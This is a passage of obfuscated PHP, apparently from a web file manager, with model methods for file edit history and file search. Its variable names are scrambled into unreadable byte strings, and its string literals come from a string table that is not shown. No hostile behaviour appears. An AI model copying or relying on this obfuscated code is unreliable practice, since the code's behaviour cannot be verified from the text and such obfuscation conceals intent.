$˛Ê™õÓ˛[403], $˛Ê™õÓ˛[500]); } public function addHistory($û•°öÛ´, $”«ÔÁ›î = '') { $èÄãîë =& $_SERVER[Çâä∆◊¡]; $ƒ‘˘∆¨˝ = array($èÄãîë[418] => $û•°öÛ´[$èÄãîë[403]], $èÄãîë[1633] => isset($û•°öÛ´[$èÄãîë[454]]) ? $û•°öÛ´[$èÄãîë[454]] : $û•°öÛ´[$èÄãîë[452]], $èÄãîë[468] => $û•°öÛ´[$èÄãîë[467]], $èÄãîë[579] => $û•°öÛ´[$èÄãîë[80]], $èÄãîë[2043] => $”«ÔÁ›î); $Ñ »¿å“ = $GLOBALS[$èÄãîë[6]][$èÄãîë[90]][$èÄãîë[1194]]; if ($Ñ »¿å“ > 1) { $this->historyAutoClear($ƒ‘˘∆¨˝[$èÄãîë[403]]); $this->add($ƒ‘˘∆¨˝); } Hook::trigger($èÄãîë[2044], $ƒ‘˘∆¨˝); Model($èÄãîë[2045])->eventFileEdit($û•°öÛ´[$èÄãîë[403]]); } private function historyAutoClear($‡ﬂ¥˜√≠) { $Â“æ˛“‘ =& $_SERVER[Çâä∆◊¡]; $èπ⁄œß¶ = Model($Â“æ˛“‘[763])->get($Â“æ˛“‘[1216]); $ÀÒßóÅ∏ = $GLOBALS[$Â“æ˛“‘[6]][$Â“æ˛“‘[90]][$Â“æ˛“‘[1194]]; $˘ ú∑ÛÃ = $èπ⁄œß¶ == $Â“æ˛“‘[1217] ? 5 : $ÀÒßóÅ∏; if ($ÀÒßóÅ∏ <= 1) { $˘ ú∑ÛÃ = 1; } if ($˘ ú∑ÛÃ >= 500) { return; } $á„√ä‹ﬁ = array($Â“æ˛“‘[418] => $‡ﬂ¥˜√≠); $ŸÛËƒ’¬ = $this->field($Â“æ˛“‘[2046])->where($á„√ä‹ﬁ)->order($Â“æ˛“‘[2040])->select(); if (!$ŸÛËƒ’¬ || $˘ ú∑ÛÃ >= count($ŸÛËƒ’¬)) { return; } $Ù›‹ûô≠ = array_to_keyvalue($ŸÛËƒ’¬, $Â“æ˛“‘[12], $Â“æ˛“‘[401]); $Ù›‹ûô≠ = array_slice($Ù›‹ûô≠, $˘ ú∑ÛÃ); $∂ÅõãÓ˜ = array_to_keyvalue($ŸÛËƒ’¬, $Â“æ˛“‘[12], $Â“æ˛“‘[467]); $∂ÅõãÓ˜ = array_slice($∂ÅõãÓ˜, $˘ ú∑ÛÃ); if (!$Ù›‹ûô≠ || !$∂ÅõãÓ˜) { return; } $á„√ä‹ﬁ = array($Â“æ˛“‘[420] => array($Â“æ˛“‘[7], $Ù›‹ûô≠)); $this->where($á„√ä‹ﬁ)->delete(); Model($Â“æ˛“‘[470])->remove($∂ÅõãÓ˜); } public function listData($…‘£À˚ó) { $á≤É◊™À =& $_SERVER[Çâä∆◊¡]; $«ÔıØ¬Ç = array($á≤É◊™À[418] => $…‘£À˚ó); $å…•–û» = $á≤É◊™À[2047]; $ó¸Ô∑…Å = $this->field($å…•–û»)->where($«ÔıØ¬Ç)->order($á≤É◊™À[2040])->selectPage(); $this->_listAppendUser($ó¸Ô∑…Å[$á≤É◊™À[364]]); $œπ›œ≥œ = Model($á≤É◊™À[763])->get($á≤É◊™À[1216]); $ÿü∞Í“ã = 5; if ($œπ›œ≥œ == $á≤É◊™À[1217]) { $ó¸Ô∑…Å[$á≤É◊™À[364]] = array_slice($ó¸Ô∑…Å[$á≤É◊™À[364]], 0, $ÿü∞Í“ã); $ó¸Ô∑…Å[$á≤É◊™À[361]] = array($á≤É◊™À[2048] => 1, $á≤É◊™À[2049] => 20, $á≤É◊™À[2050] => 1, $á≤É◊™À[2051] => count($ó¸Ô∑…Å[$á≤É◊™À[364]])); } return $ó¸Ô∑…Å; } protected function _listAppendUser(&$…ÈÃåã˚) { $≈˛¢å‡ﬂ =& $_SERVER[Çâä∆◊¡]; $‚‰çñ ñ = array_to_keyvalue($…ÈÃåã˚, $≈˛¢å‡ﬂ[12], $≈˛¢å‡ﬂ[1642]); $˛ÓÂ‘˘· = Model($≈˛¢å‡ﬂ[538])->userListInfo($‚‰çñ ñ); foreach ($…ÈÃåã˚ as &$Íåƒ˙ì©) { $¨≤¢òÂæ = $Íåƒ˙ì©[$≈˛¢å‡ﬂ[1642]]; $Íåƒ˙ì©[$≈˛¢å‡ﬂ[452]] = $˛ÓÂ‘˘·[$¨≤¢òÂæ] ? $˛ÓÂ‘˘·[$¨≤¢òÂæ] : !1; } unset($Íåƒ˙ì©); } public function fileInfo($‰∫”ô≥ﬁ) { $é¶ê‰Ì¯ =& $_SERVER[Çâä∆◊¡]; $≥£Î˝Ω¨ = $this->tablePrefix; $ÓŸÜäéÃ = "{$≥£Î˝Ω¨}\x69\157\137\146\x69\154\x65\x20\x66\151\154\145\163\x20\157\x6e\x20\x66\151\x6c\x65\163\56\146\x69\154\145\111\x44\x20\x3d\40\x68\x69\x73\x74\157\162\171\x2e\x66\151\x6c\x65\111\104"; return $this->alias($é¶ê‰Ì¯[2052])->where(array($é¶ê‰Ì¯[420] => $‰∫”ô≥ﬁ))->join($ÓŸÜäéÃ, $é¶ê‰Ì¯[2053])->find(); } public function removeItem($§–∞ü¥â) { $«ıÃôíÎ =& $_SERVER[Çâä∆◊¡]; $Ô¡î√Â£ = array($«ıÃôíÎ[420] => $§–∞ü¥â); $€ﬁ∞…˚ú = $this->where($Ô¡î√Â£)->find(); if ($€ﬁ∞…˚ú) { $∆∏öÛ∞± = $this->where($Ô¡î√Â£)->delete(); Model($«ıÃôíÎ[470])->remove($€ﬁ∞…˚ú[$«ıÃôíÎ[467]]); return $∆∏öÛ∞±; } return !1; } public function removeBySource($ÔπŸ™¨˛) { $¬Ñ¢ÀÕ =& $_SERVER[Çâä∆◊¡]; if (!$ÔπŸ™¨˛) { return !1; } if (!is_array($ÔπŸ™¨˛)) { $ÔπŸ™¨˛ = array($ÔπŸ™¨˛); } $ûè°µÿô = array($¬Ñ¢ÀÕ[418] => array($¬Ñ¢ÀÕ[7], $ÔπŸ™¨˛)); $Ê§úëó„ = $this->field($¬Ñ¢ÀÕ[468])->where($ûè°µÿô)->select(); if ($Ê§úëó„) { $this->where($ûè°µÿô)->delete(); $‚ó¿¸Ω = array_to_keyvalue($Ê§úëó„, $¬Ñ¢ÀÕ[12], $¬Ñ¢ÀÕ[467]); Model($¬Ñ¢ÀÕ[470])->remove($‚ó¿¸Ω); } return !0; } public function setDetail($ Öç˜ƒµ, $õûÜŒûΩ) { $±áÒ≤ı› =& $_SERVER[Çâä∆◊¡]; return $this->where(array($±áÒ≤ı›[420] => $ Öç˜ƒµ))->save(array($±áÒ≤ı›[2043] => $õûÜŒûΩ)); } public function rollbackToItem($„◊µôÈï, $Ù´ãÙƒñ) { $Ãü˙ä¢¨ =& $_SERVER[Çâä∆◊¡]; $’œ˛Ê˚ﬁ = Model($Ãü˙ä¢¨[818])->sourceInfo($„◊µôÈï); $this->addHistory($’œ˛Ê˚ﬁ, LNG($Ãü˙ä¢¨[2054])); $„Ù•ã»¸ = $this->find($Ù´ãÙƒñ); $äª˛ßë¡ = array($Ãü˙ä¢¨[467] => $„Ù•ã»¸[$Ãü˙ä¢¨[467]], $Ãü˙ä¢¨[80] => $„Ù•ã»¸[$Ãü˙ä¢¨[80]], $Ãü˙ä¢¨[86] => time(), $Ãü˙ä¢¨[454] => USER_ID); Model($Ãü˙ä¢¨[818])->where(array($Ãü˙ä¢¨[403] => $„◊µôÈï))->save($äª˛ßë¡); return $this->where(array($Ãü˙ä¢¨[420] => $Ù´ãÙƒñ))->delete(); } public function clearSame($é‹È»‚±) { $¶◊ßπƒÌ =& $_SERVER[Çâä∆◊¡]; $∑ûû˛ßΩ = $this->listData($é‹È»‚±); $Ô˙Â›öí = array_to_keyvalue_group($∑ûû˛ßΩ, $¶◊ßπƒÌ[467]); $·‡à¯Ë« = array(); $œ±ùﬁÁó = array(); foreach ($Ô˙Â›öí as $æµõÕ÷ä) { if (!$æµõÕ÷ä || count($æµõÕ÷ä) <= 1) { continue; } foreach ($æµõÕ÷ä as $úóª€Â›) { $·‡à¯Ë«[] = $úóª€Â›[$¶◊ßπƒÌ[467]]; $œ±ùﬁÁó[] = $úóª€Â›[$¶◊ßπƒÌ[401]]; } } if (!$œ±ùﬁÁó) { return; } $this->where(array($¶◊ßπƒÌ[401] => array($¶◊ßπƒÌ[7], $œ±ùﬁÁó)))->delete(); Model($¶◊ßπƒÌ[470])->remove($·‡à¯Ë«); } public function userSpace() { $ÆËÍãÎú =& $_SERVER[Çâä∆◊¡]; $üÙ«ü∆ù = $this->tablePrefix; $‚ƒ˝Ω™â = array($ÆËÍãÎú[1633] => USER_ID); $ √Èõå‚ = "{$üÙ«ü∆ù}\151\x6f\137\146\151\x6c\x65\x20\x66\x69\154\145\x73\40\157\156\x20\146\x69\x6c\145\163\56\146\151\x6c\x65\111\x44\40\75\x20\150\151\163\x74\157\162\x79\56\146\151\x6c\x65\111\x44"; return $this->alias($ÆËÍãÎú[2052])->where($‚ƒ˝Ω™â)->join($ √Èõå‚, $ÆËÍãÎú[2053])->sum($ÆËÍãÎú[80]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($®òÍ◊çª) { $˜îÅ‚¶º =& $_SERVER[Çâä∆◊¡]; $î∆˙£ôË = KodIO::fileTypeList(); $ÄÄ‹±™Ó = $î∆˙£ôË[$®òÍ◊çª]; if (!$ÄÄ‹±™Ó) { return array(); } $¨ÄÇ≤ôÿ = $ÄÄ‹±™Ó[$˜îÅ‚¶º[167]]; $œ≠Çßâ¯ = $˜îÅ‚¶º[7]; if (!$ÄÄ‹±™Ó[$˜îÅ‚¶º[167]]) { $‰ûï•˜ò = array_to_keyvalue($î∆˙£ôË, $˜îÅ‚¶º[12], $˜îÅ‚¶º[167]); $¨ÄÇ≤ôÿ = implode($˜îÅ‚¶º[50], $‰ûï•˜ò); $œ≠Çßâ¯ = $˜îÅ‚¶º[2055]; } $‘ˆèŒé˘ = explode($˜îÅ‚¶º[50], trim($¨ÄÇ≤ôÿ, $˜îÅ‚¶º[50])); return array($œ≠Çßâ¯, $‘ˆèŒé˘); } public function listPathType($ª¡¶ç›í) { $‚ÙÇó√Å =& $_SERVER[Çâä∆◊¡]; $ﬂÚë¯´˜ = $this->fileTypeWhere($ª¡¶ç›í); if (!$ﬂÚë¯´˜) { return array(); } $ÒÄÊã¨í = array($‚ÙÇó√Å[580] => SourceModel::TYPE_USER, $‚ÙÇó√Å[581] => USER_ID, $‚ÙÇó√Å[577] => 0, $‚ÙÇó√Å[578] => $ﬂÚë¯´˜); return $this->listSource($ÒÄÊã¨í); } public function listSearch($∑§¢¡¥í, $ïÙíŒ¯‘ = 300) { $à·≥¯ù≥ =& $_SERVER[Çâä∆◊¡]; if (isset($∑§¢¡¥í[$à·≥¯ù≥[1901]]) && $∑§¢¡¥í[$à·≥¯ù≥[1901]]) { $∑§¢¡¥í[$à·≥¯ù≥[1901]] = str_replace($à·≥¯ù≥[379], $à·≥¯ù≥[2056], trim($∑§¢¡¥í[$à·≥¯ù≥[1901]])); } $ø§áÆ∆ù = $this->_parseSearchWhere($∑§¢¡¥í); $Ã‡—Ö¢¥ = $ø§áÆ∆ù; if (!isset($ø§áÆ∆ù[$à·≥¯ù≥[431]])) { $ø§áÆ∆ù[$à·≥¯ù≥[431]] = 0; } $‡å∆ºØÓ = $à·≥¯ù≥[2057]; $È≤áø√Ñ = $‡å∆ºØÓ; $this->_listSearchBindPinyin($∑§¢¡¥í, $ø§áÆ∆ù, $‡å∆ºØÓ); $this->alias($à·≥¯ù≥[444])->_makeOrder(); $ø§áÆ∆ù = $this->parseWhereLike($ø§áÆ∆ù); $ò¶“ÀÕﬂ = $this->distinct(!0)->field($‡å∆ºØÓ)->where($ø§áÆ∆ù)->selectPage($ïÙíŒ¯‘); $this->_listSearchFileContent($ò¶“ÀÕﬂ, $∑§¢¡¥í, $È≤áø√Ñ, $Ã‡—Ö¢¥); $this->_listSearchDesc($ò¶“ÀÕﬂ, $∑§¢¡¥í, $È≤áø√Ñ); $this->_listSearchTag($ò¶“ÀÕﬂ, $∑§¢¡¥í, $È≤áø√Ñ); $this->_listSearchGroupTag($ò¶“ÀÕﬂ, $∑§¢¡¥í, $È≤áø√Ñ); $this->_listDataApply($ò¶“ÀÕﬂ[$à·≥¯ù≥[364]]); $this->_listMake($ò¶“ÀÕﬂ); return $ò¶“ÀÕﬂ; } private function _listSearchFileContent(&$¨†˜≠∑ã, $‰“îÂıÁ, $åπﬂÆæÎ, $¯º’å˘œ) { $‹©Íπíè =& $_SERVER[Çâä∆◊¡]; if (!$‰“îÂıÁ[$‹©Íπíè[1901]] || $¨†˜≠∑ã[$‹©Íπíè[361]][$‹©Íπíè[348]] > 1) { return; } if (!isset($¯º’å˘œ[$‹©Íπíè[32]]) || !is_array($‰“îÂıÁ[$‹©Íπíè[467]])) { return; } $¯º’å˘œ[$‹©Íπíè[467]] = array($‹©Íπíè[7], $‰“îÂıÁ[$‹©Íπíè[467]]); unset($¯º’å˘œ[$‹©Íπíè[32]]); unset($‰“îÂıÁ[$‹©Íπíè[467]]); $©åÂ∏˚ù = $this->field($åπﬂÆæÎ)->where($¯º’å˘œ)->limit($‹©Íπíè[2058])->select(); if (!$©åÂ∏˚ù || count($©åÂ∏˚ù) == 0) { return; } $¨†˜≠∑ã[$‹©Íπíè[364]] = array_merge($©åÂ∏˚ù, $¨†˜≠∑ã[$‹©Íπíè[364]]); $¨†˜≠∑ã[$‹©Íπíè[361]][$‹©Íπíè[362]] += count($©åÂ∏˚ù); } private function _listSearchTag(&$‡˘∏’˛ˆ, $“ƒ˘«¬Ù, $ﬂ≥ÃŸ∫ö) { $ÇŒµÎ‰Ê =& $_SERVER[Çâä∆◊¡]; if (!$“ƒ˘«¬Ù[$ÇŒµÎ‰Ê[1901]] || $‡˘∏’˛ˆ[$ÇŒµÎ‰Ê[361]][$ÇŒµÎ‰Ê[348]] > 1) { return; } $Ò£Ç¨ë√ = Model($ÇŒµÎ‰Ê[2059])->listData(); $™÷¥¯·ƒ = array(); $•Ñƒ‹î∞ = $“ƒ˘«¬Ù[$ÇŒµÎ‰Ê[1901]]; foreach ($Ò£Ç¨ë√ as $¸‡º∆∑) { $˜ˆ‡÷‰ú = $¸‡º∆∑[$ÇŒµÎ‰Ê[32]]; $ÔùÕåÕ˘ = str_replace($ÇŒµÎ‰Ê[53], $ÇŒµÎ‰Ê[12], Pinyin::get($˜ˆ‡÷‰ú)); if (stripos($˜ˆ‡÷‰ú, $•Ñƒ‹î∞) !== !1 || stripos($ÔùÕåÕ˘, $•Ñƒ‹î∞) !== !1) { $™÷¥¯·ƒ[] = $¸‡º∆∑[$ÇŒµÎ‰Ê[401]]; } } if (!$™÷¥¯·ƒ) { return; } $çóÙﬂ∂’ = array($ÇŒµÎ‰Ê[427] => array($ÇŒµÎ‰Ê[7], $™÷¥¯·ƒ), $ÇŒµÎ‰Ê[1642] => USER_ID); $•ú≤††¬ = Model($ÇŒµÎ‰Ê[428])->field($ÇŒµÎ‰Ê[78])->where($çóÙﬂ∂’)->select(); $•ú≤††¬ = array_to_keyvalue($•ú≤††¬, $ÇŒµÎ‰Ê[12], $ÇŒµÎ‰Ê[78]); $á§π’ﬂÍ = array_unique($•ú≤††¬); $this->_listSearchMerge($‡˘∏’˛ˆ, $“ƒ˘«¬Ù, $ﬂ≥ÃŸ∫ö, $á§π’ﬂÍ); } private function _listSearchDesc(&$–‘£Ö´€, $ÀÎ©§óô, $ÂïÉ‹£æ) { $†§ƒ∑ãî =& $_SERVER[Çâä∆◊¡]; if (!$ÀÎ©§óô[$†§ƒ∑ãî[1901]] || $–‘£Ö´€[$†§ƒ∑ãî[361]][$†§ƒ∑ãî[348]] > 1) { return; } $Ö˝πÏ¯ = $this->listSearchChildren($ÀÎ©§óô[$†§ƒ∑ãî[498]]); $Ö˝πÏ¯ = array_unique($Ö˝πÏ¯); if (!$Ö˝πÏ¯) { return; } $—±“¸∆‚ = array($†§ƒ∑ãî[403] => array($†§ƒ∑ãî[7], $Ö˝πÏ¯), $†§ƒ∑ãî[95] => $†§ƒ∑ãî[451], $†§ƒ∑ãî[369] => array($†§ƒ∑ãî[378], $†§ƒ∑ãî[1903] . $ÀÎ©§óô[$†§ƒ∑ãî[1901]] . $†§ƒ∑ãî[1903])); $éΩ≈∂ ˆ = Model($†§ƒ∑ãî[563])->field($†§ƒ∑ãî[403])->where($—±“¸∆‚)->select(); $ Òù¨‡Ê = array_to_keyvalue($éΩ≈∂ ˆ, $†§ƒ∑ãî[12], $†§ƒ∑ãî[403]); $this->_listSearchMerge($–‘£Ö´€, $ÀÎ©§óô, $ÂïÉ‹£æ, $ Òù¨‡Ê); } private function _listSearchGroupTag(&$à®ä…’ñ, $í€˜˙‰ˆ, $ﬂàÏôœÒ) { $ä—π≠Ñ¶ =& $_SERVER[Çâä∆◊¡]; if (!$í€˜˙‰ˆ[$ä—π≠Ñ¶[1901]] || $à®ä…’ñ[$ä—π≠Ñ¶[361]][$ä—π≠Ñ¶[348]] > 1 || !$í€˜˙‰ˆ[$ä—π≠Ñ¶[498]]) { return; } $óø¨í◊¨ = $this->sourceInfo($í€˜˙‰ˆ[$ä—π≠Ñ¶[498]]); if (!$óø¨í◊¨ || $óø¨í◊¨[$ä—π≠Ñ¶[412]] != SourceModel::TYPE_GROUP) { return; } $π÷∞çÓÛ = $óø¨í◊¨[$ä—π≠Ñ¶[504]]; $Ã‚ªã‡Ü = Model($ä—π≠Ñ¶[2060])->get($π÷∞çÓÛ); $° Ûæ◊ø = array(); $ê¥Ç˜ìá = $í€˜˙‰ˆ[$ä—π≠Ñ¶[1901]]; foreach ($Ã‚ªã‡Ü[$ä—π≠Ñ¶[364]] as $ÙÔË£⁄˛) { $ãû˝âœ° = $ÙÔË£⁄˛[$ä—π≠Ñ¶[32]]; $ïÌ¡Èû≥ = str_replace($ä—π≠Ñ¶[53], $ä—π≠Ñ¶[12], Pinyin::get($ãû˝âœ°)); if (stripos($ãû˝âœ°, $ê¥Ç˜ìá) !== !1 || stripos($ïÌ¡Èû≥, $ê¥Ç˜ìá) !== !1) { $° Ûæ◊ø[] = $ÙÔË£⁄˛[$ä—π≠Ñ¶[401]]; } } if (!$° Ûæ◊ø) { return; } $òÒ«»ﬁ€ = array($ä—π≠Ñ¶[427] => array($ä—π≠Ñ¶[7], $° Ûæ◊ø), $ä—π≠Ñ¶[1642] => 0, $ä—π≠Ñ¶[33] => $ä—π≠Ñ¶[1923] . $π÷∞çÓÛ); $æÍ¡◊Ù∫ = Model($ä—π≠Ñ¶[428])->field($ä—π≠Ñ¶[78])->where($òÒ«»ﬁ€)->select(); $æÍ¡◊Ù∫ = array_to_keyvalue($æÍ¡◊Ù∫, $ä—π≠Ñ¶[12], $ä—π≠Ñ¶[78]); $„Å–ößÉ = array_unique($æÍ¡◊Ù∫); $this->_listSearchMerge($à®ä…’ñ, $í€˜˙‰ˆ, $ﬂàÏôœÒ, $„Å–ößÉ); } private function _listSearchMerge(&$£„™ˆ‹˘, $Ø‚éÃ§É, $†ÃÍœ¸Ü, $ô‰Éä£¨) { $‡©ﬂ∫Óã =& $_SERVER[Çâä∆◊¡]; if (!$ô‰Éä£¨) { return; } $ßï∞óÊÆ = array_to_keyvalue($£„™ˆ‹˘[$‡©ﬂ∫Óã[364]], $‡©ﬂ∫Óã[12], $‡©ﬂ∫Óã[403]); $£–»—ˆ„ = array_diff($ô‰Éä£¨, $ßï∞óÊÆ); if (!$£–»—ˆ„) { return; } $÷™êûò¬ = array($‡©ﬂ∫Óã[403] => array($‡©ﬂ∫Óã[7], $£–»—ˆ„)); $ÁÑº–è = $this->field($†ÃÍœ¸Ü)->where($÷™êûò¬)->select(); if (!$ÁÑº–è) { return; } $ÁŒ£èÑä = array(); foreach ($ÁÑº–è as $∞ìı⁄ﬂ¬) { if ($this->_listSearchFilter($∞ìı⁄ﬂ¬, $Ø‚éÃ§É)) { $ÁŒ£èÑä[] = $∞ìı⁄ﬂ¬; } } $£„™ˆ‹˘[$‡©ﬂ∫Óã[364]] = array_merge($ÁŒ£èÑä, $£„™ˆ‹˘[$‡©ﬂ∫Óã[364]]); $£„™ˆ‹˘[$‡©ﬂ∫Óã[361]][$‡©ﬂ∫Óã[362]] += count($ÁŒ£èÑä); } private function _listSearchFilter($ªΩãÈç¯, $ë•Ê∆Ü∂) { $€óŒ†àÛ =& $_SERVER[Çâä∆◊¡]; $õÔ¬Ú®Ã = $ªΩãÈç¯[$€óŒ†àÛ[411]] == $€óŒ†àÛ[89]; if (!strstr($ªΩãÈç¯[$€óŒ†àÛ[521]], $€óŒ†àÛ[50] . $ë•Ê∆Ü∂[$€óŒ†àÛ[498]] . $€óŒ†àÛ[50])) { return !1; } if (isset($ë•Ê∆Ü∂[$€óŒ†àÛ[413]]) && $ë•Ê∆Ü∂[$€óŒ†àÛ[413]] != $€óŒ†àÛ[1864]) { if ($ë•Ê∆Ü∂[$€óŒ†àÛ[413]] == $€óŒ†àÛ[79] && !$õÔ¬Ú®Ã) { return !1; } if ($ë•Ê∆Ü∂[$€óŒ†àÛ[413]] != $€óŒ†àÛ[79] && $õÔ¬Ú®Ã) { return !1; } if (!strstr($ªΩãÈç¯[$€óŒ†àÛ[167]], $€óŒ†àÛ[50] . $ë•Ê∆Ü∂[$€óŒ†àÛ[413]] . $€óŒ†àÛ[50])) { return !1; } } if (isset($ë•Ê∆Ü∂[$€óŒ†àÛ[2061]]) && $ë•Ê∆Ü∂[$€óŒ†àÛ[2061]] < $ªΩãÈç¯[$€óŒ†àÛ[80]]) { return !1; } if (isset($ë•Ê∆Ü∂[$€óŒ†àÛ[2062]]) && $ë•Ê∆Ü∂[$€óŒ†àÛ[2062]] > $ªΩãÈç¯[$€óŒ†àÛ[80]]) { return !1; } if (isset($ë•Ê∆Ü∂[$€óŒ†àÛ[594]]) && $ë•Ê∆Ü∂[$€óŒ†àÛ[594]] != $ªΩãÈç¯[$€óŒ†àÛ[454]]) { return !1; } return !0; } public function listSearchChildren($£‘›÷ÅÁ, $ÄØô≈’Ü = 5000) { $™ÿÂΩ®± =& $_SERVER[Çâä∆◊¡]; $œç§Ω§µ = array(); $Öå‹ﬁÖÃ = $this->sourceInfo($£‘›÷ÅÁ); $ø¯í¨Ù¯ = array($™ÿÂΩ®±[521] => array($™ÿÂΩ®±[378], $Öå‹ﬁÖÃ[$™ÿÂΩ®±[521]] . $Öå‹ﬁÖÃ[$™ÿÂΩ®±[403]] . $™ÿÂΩ®±[545])); $Ê≠‡ÎÿŒ = $this->field($™ÿÂΩ®±[80])->where($ø¯í¨Ù¯)->limit($ÄØô≈’Ü + 1)->select(); $ÿñ∂ÛÚ  = is_array($Ê≠‡ÎÿŒ) ? count($Ê≠‡ÎÿŒ) : 0; if ($ÿñ∂ÛÚ  > $ÄØô≈’Ü) { return $this->_listSearchChildrenNear($£‘›÷ÅÁ, $ÄØô≈’Ü); } $åçûﬂ§Õ = $this->field($™ÿÂΩ®±[403])->where($ø¯í¨Ù¯)->select(); $œç§Ω§µ = array_to_keyvalue($åçûﬂ§Õ, $™ÿÂΩ®±[12], $™ÿÂΩ®±[403]); return $œç§Ω§µ; } private function _listSearchChildrenNear($∏æËµ∑œ, $Äﬁ—›≈—) { $∏√ˆ÷∆ƒ =& $_SERVER[Çâä∆◊¡]; $ß ¸¥¥¿ = array(); $¯é≤Œœ« = array($∏√ˆ÷∆ƒ[498] => $∏æËµ∑œ); $ÌôªÜ·€ = $this->field($∏√ˆ÷∆ƒ[2063])->where($¯é≤Œœ«)->select(); $¶¯¶¸Åı = array_to_keyvalue(array_filter_by_field($ÌôªÜ·€, $∏√ˆ÷∆ƒ[411], $∏√ˆ÷∆ƒ[89]), $∏√ˆ÷∆ƒ[12], $∏√ˆ÷∆ƒ[403]); $ß ¸¥¥¿ = array_merge($ß ¸¥¥¿, array_to_keyvalue($ÌôªÜ·€, $∏√ˆ÷∆ƒ[12], $∏√ˆ÷∆ƒ[403])); if (!$¶¯¶¸Åı) { return $ß ¸¥¥¿; } $¯é≤Œœ« = array($∏√ˆ÷∆ƒ[498] => array($∏√ˆ÷∆ƒ[7], $¶¯¶¸Åı)); $ÌôªÜ·€ = $this->field($∏√ˆ÷∆ƒ[2063])->where($¯é≤Œœ«)->limit($Äﬁ—›≈—)->select(); $ß ¸¥¥¿ = array_merge($ß ¸¥¥¿, array_to_keyvalue($ÌôªÜ·€, $∏√ˆ÷∆ƒ[12], $∏√ˆ÷∆ƒ[403])); $ß ¸¥¥¿ = array_slice($ß ¸¥¥¿, 0, $Äﬁ—›≈—); return $ß ¸¥¥¿; } private function _listSearchBindPinyin($√æñÛ”é, &$¸‰ ≤Ôœ, &$’ÕÑ≥ì‘) { $Âı ‘’® =& $_SERVER[Çâä∆◊¡]; if (!isset($√æñÛ”é[$Âı ‘’®[1901]]) || !$√æñÛ”é[$Âı ‘’®[1901]]) { return; } if (!Input::check($√æñÛ”é[$Âı ‘’®[1901]], $Âı ‘’®[313]) || strlen($√æñÛ”é[$Âı ‘’®[1901]]) < 2) { return; } $Ü®àÅøÈ = "\x4c\x45\x46\124\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x69\x6f\137\x73\x6f\165\162\143\x65\x5f\155\145\x74\141\x20\x6d\145\164\141\40\x6f\x6e\40\x73\157\x75\x72\143\145\x2e\x73\x6f\165\162\143\145\111\x44\40\x3d\x20\x6d\x65\x74\x61\x2e\x73\157\x75\162\143\x65\x49\x44"; $˝∏∞˚∂≤ = array(); $’ÕÑ≥ì‘ = str_replace(array($Âı ‘’®[226], $Âı ‘’®[53], $Âı ‘’®[2064]), $Âı ‘’®[12], $’ÕÑ≥ì‘); $’ÕÑ≥ì‘ = $Âı ‘’®[436] . str_replace($Âı ‘’®[50], $Âı ‘’®[437], $’ÕÑ≥ì‘); $∆¶ÔËπ¡ = $¸‰ ≤Ôœ[$Âı ‘’®[32]]; unset($¸‰ ≤Ôœ[$Âı ‘’®[32]]); foreach ($¸‰ ≤Ôœ as $∫†≥™‘œ => $ÿ˝’¿ìë) { $˝∏∞˚∂≤[$Âı ‘’®[436] . $∫†≥™‘œ] = $ÿ˝’¿ìë; } foreach ($∆¶ÔËπ¡ as $ªñ˘ÕÚø) { $˝∏∞˚∂≤[] = array($Âı ‘’®[441] => $ªñ˘ÕÚø, $Âı ‘’®[987] => $Âı ‘’®[1905], array($Âı ‘’®[2065] => $ªñ˘ÕÚø, $Âı ‘’®[2066] => array($Âı ‘’®[7], array($Âı ‘’®[464], $Âı ‘’®[463])))); } $this->join($Ü®àÅøÈ); $¸‰ ≤Ôœ = $˝∏∞˚∂≤; } private function _parseSearchWhere($Üç«’≈≈) { $œ‚öä»ö =& $_SERVER[Çâä∆◊¡]; $ä◊ΩÅ˝± = array(); if (isset($Üç«’≈≈[$œ‚öä»ö[754]]) && $Üç«’≈≈[$œ‚öä»ö[754]]) { $ä◊ΩÅ˝±[$œ‚öä»ö[86]] = array($œ‚öä»ö[2067], $Üç«’≈≈[$œ‚öä»ö[754]]); } if (isset($Üç«’≈≈[$œ‚öä»ö[496]]) && $Üç«’≈≈[$œ‚öä»ö[496]]) { $¿⁄£”ú⁄ = array($œ‚öä»ö[2068], $Üç«’≈≈[$œ‚öä»ö[496]]); if ($ä◊ΩÅ˝±[$œ‚öä»ö[86]]) { $ä◊ΩÅ˝±[$œ‚öä»ö[86]] = array($ä◊ΩÅ˝±[$œ‚öä»ö[86]], $¿⁄£”ú⁄, $œ‚öä»ö[2069]); } else { $ä◊ΩÅ˝±[$œ‚öä»ö[86]] = $¿⁄£”ú⁄; } } if (isset($Üç«’≈≈[$œ‚öä»ö[2061]]) && $Üç«’≈≈[$œ‚öä»ö[2061]] > 0) { $ä◊ΩÅ˝±[$œ‚öä»ö[80]] = array($œ‚öä»ö[2067], $Üç«’≈≈[$œ‚öä»ö[2061]]); } if (isset($Üç«’≈≈[$œ‚öä»ö[2062]]) && $Üç«’≈≈[$œ‚öä»ö[2062]]) { $¿⁄£”ú⁄ = array($œ‚öä»ö[2068], $Üç«’≈≈[$œ‚öä»ö[2062]]); if ($ä◊ΩÅ˝±[$œ‚öä»ö[80]]) { $ä◊ΩÅ˝±[$œ‚öä»ö[80]] = array($ä◊ΩÅ˝±[$œ‚öä»ö[80]], $¿⁄£”ú⁄, $œ‚öä»ö[2069]); } else { $ä◊ΩÅ˝±[$œ‚öä»ö[80]] = $¿⁄£”ú⁄; } } if (isset($Üç«’≈≈[$œ‚öä»ö[594]]) && $Üç«’≈≈[$œ‚öä»ö[594]]) { $ä◊ΩÅ˝±[] = array($œ‚öä»ö[454] => $Üç«’≈≈[$œ‚öä»ö[594]], $œ‚öä»ö[452] => $Üç«’≈≈[$œ‚öä»ö[594]], $œ‚öä»ö[987] => $œ‚öä»ö[1905]); } if (isset($Üç«’≈≈[$œ‚öä»ö[413]]) && $Üç«’≈≈[$œ‚öä»ö[413]]) { $µÏ∞Ω¯™ = $Üç«’≈≈[$œ‚öä»ö[413]]; if ($µÏ∞Ω¯™ == $œ‚öä»ö[79]) { $ä◊ΩÅ˝±[$œ‚öä»ö[411]] = 1; } else { if ($µÏ∞Ω¯™ == $œ‚öä»ö[2070]) { $ä◊ΩÅ˝±[$œ‚öä»ö[411]] = 0; } else { if ($µÏ∞Ω¯™) { $µÏ∞Ω¯™ = is_array($µÏ∞Ω¯™) ? $µÏ∞Ω¯™ : explode($œ‚öä»ö[50], $µÏ∞Ω¯™); $ä◊ΩÅ˝±[$œ‚öä»ö[413]] = array($œ‚öä»ö[419], $µÏ∞Ω¯™); $ä◊ΩÅ˝±[$œ‚öä»ö[411]] = 0; 